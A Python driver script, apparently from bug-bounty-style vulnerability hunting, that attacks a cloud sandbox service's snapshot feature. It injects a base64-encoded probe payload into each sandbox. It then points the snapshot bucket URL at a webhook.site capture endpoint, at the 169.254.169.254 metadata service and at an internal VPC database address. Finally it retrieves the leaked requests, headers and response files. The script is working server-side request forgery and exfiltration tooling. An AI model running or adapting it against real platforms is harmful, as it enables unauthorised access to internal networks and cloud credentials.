# -*- coding: utf-8 -*-
"""v222 驱动: bucketBaseUrl 变体 -> CreateSnapshot -> resume 读响应 -> webhook.site 捕获检查
变体: https 公网 / http 明文 / IMDS / VPC 内网 PG"""
import sys, os, time, base64, json, urllib.request
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ, fresh_sandbox, cmd

PAY = r'D:\scan\skills\non-traditional-vuln-hunting\vda222_probe_guest.py'
UUID = open('_wh_uuid.txt').read().strip()

VARIANTS = [
    ('v222a', 'https://webhook.site/%s' % UUID),
    ('v222b', 'http://webhook.site/%s' % UUID),
    ('v222c', 'http://169.254.169.254/latest/meta-data/'),
    ('v222d', 'http://172.31.0.2:5432/'),
]


def inject(sid, dst, content):
    b64 = base64.b64encode(content if isinstance(content, bytes) else content.encode()).decode()
    s = "import base64;open('%s','wb').write(base64.b64decode('%s'))" % (dst, b64)
    c, r = cmd(sid, 'python3', ['-c', s], 60000)
    return c


def wh_get(path):
    req = urllib.request.Request('https://webhook.site/token/%s%s' % (UUID, path))
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return -1, str(e).encode()


def main():
    t0 = time.time()
    for name, bucket in VARIANTS:
        print('\n===== %s bucket=%s =====' % (name, bucket), flush=True)
        api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (name, TEAM, PROJ))
        sid = fresh_sandbox(name)
        print('[create] %s sid=%s' % (name, sid), flush=True)
        inject(sid, '/vercel/sandbox/vda222_probe_guest.py', open(PAY, 'rb').read())
        c, r = cmd(sid, 'python3', ['/vercel/sandbox/vda222_probe_guest.py', bucket, sid],
                   25000)
        print('[cmd]', c, (r or '')[:500], flush=True)
        time.sleep(4)
        # 状态
        c, r = api('GET', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (name, TEAM, PROJ))
        st = ''
        try:
            d = json.loads(r)
            st = d.get('sandbox', {}).get('status', '')
        except Exception:
            st = (r or '')[:120]
        print('[status]', c, st, flush=True)
        # resume 读落盘响应
        c, r = api('GET', '/v2/sandboxes/%s?teamId=%s&projectId=%s&resume=true' % (name, TEAM, PROJ), None, 60)
        print('[resume]', c, (r or '')[:150], flush=True)
        try:
            d = json.loads(r)
            sid2 = d.get('sandbox', {}).get('currentSessionId') or sid
        except Exception:
            sid2 = sid
        time.sleep(6)
        c, r = cmd(sid2, 'bash', ['-c', 'cat /vercel/sandbox/v222_resp /vercel/sandbox/v222_marker.txt 2>&1'], 25000)
        print('[resp file]', c, (r or '')[:1500], flush=True)
        api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (name, TEAM, PROJ))
        time.sleep(2)

    # 查 webhook.site 请求
    print('\n===== webhook.site requests =====', flush=True)
    c, r = wh_get('/requests?sorting=newest')
    print('[wh list]', c, flush=True)
    try:
        d = json.loads(r)
        reqs = d.get('data', [])
        print('total=%d' % len(reqs), flush=True)
        for i, rq in enumerate(reqs[:10]):
            print('--- req %d ---' % i, flush=True)
            print('method=%s url=%s' % (rq.get('method'), rq.get('url')), flush=True)
            print('headers: %s' % json.dumps(rq.get('headers', {}))[:1500], flush=True)
            print('content: %r' % (rq.get('content') or '')[:500], flush=True)
    except Exception as e:
        print('wh parse err', e, (r or '')[:300], flush=True)

    print('\nCLEANED total %.0fs' % (time.time() - t0), flush=True)


if __name__ == '__main__':
    main()
